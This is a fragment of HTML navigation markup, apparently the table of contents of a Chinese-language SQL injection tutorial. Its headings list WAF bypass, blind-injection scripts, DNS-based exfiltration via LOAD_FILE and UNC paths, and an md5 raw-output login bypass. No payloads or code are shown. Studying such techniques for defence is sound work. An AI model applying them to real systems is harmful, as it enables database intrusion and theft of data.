Waf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#False-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.15.</span> <span class="nav-text">False 注入绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#False-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.0.15.1.</span> <span class="nav-text">False 注入原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#False-%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.0.15.2.</span> <span class="nav-text">False 注入利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.0.15.3.</span> <span class="nav-text">综合利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="nav-number">1.3.0.15.4.</span> <span class="nav-text">盲注脚本</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.0.16.</span> <span class="nav-text">DNS注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.0.16.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#LOAD-FILE-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.0.16.2.</span> <span class="nav-text">LOAD_FILE() 读取文件的函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DNSLOG%E5%B9%B3%E5%8F%B0"><span class="nav-number">1.3.0.16.3.</span> <span class="nav-text">DNSLOG平台:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UNC%E8%B7%AF%E5%BE%84"><span class="nav-number">1.3.0.16.4.</span> <span class="nav-text">UNC路径</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%98%E2%80%9C-md5-pass-true-%E2%80%9D%E2%80%98-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.0.17.</span> <span class="nav-text">‘“.md5($pass,true).”‘ 登录绕过</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
